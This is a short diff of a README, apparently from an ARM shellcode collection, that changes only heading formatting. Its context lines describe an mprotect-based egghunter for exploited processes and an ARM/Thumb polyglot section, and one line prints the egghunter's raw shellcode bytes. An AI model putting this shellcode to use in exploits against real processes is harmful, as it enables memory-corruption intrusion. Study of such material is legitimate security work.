@@ -1,8 +1,7 @@
 ARM Shellcode
 =============
 
-1. mprotect egghunter
----------------------
+## 1. mprotect egghunter ##
 
 - Searches for an EGG (4+4 byte value) in the memory of the exploited process.
 - Uses mprotect() to test the presence of pages in the virtual memory space of the target process.
@@ -14,8 +13,7 @@ RAW SHELLCODE:
 $mprotect_egghunter = "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x6d\x40\x7d\x27\x01\x21\x09\x03\x07\x22\x28\x1c\x01\xdf\x0c\x30\x01\xd1\x6d\x18\xf9\xe7\x6e\x18\x05\x48\x2b\x68\x04\x35\xb5\x42\xf3\xd0\x2c\x68\x98\x42\xf8\xd1\xa3\x42\xf6\xd1\x04\x35\x28\x47HACK";
 ```
 
-2. Quantum Leap code
---------------------
+## 2. Quantum Leap code ##
 
 - ARM/Thumb Polyglot code.
 - Can be started in ARM mode or Thumb mode.
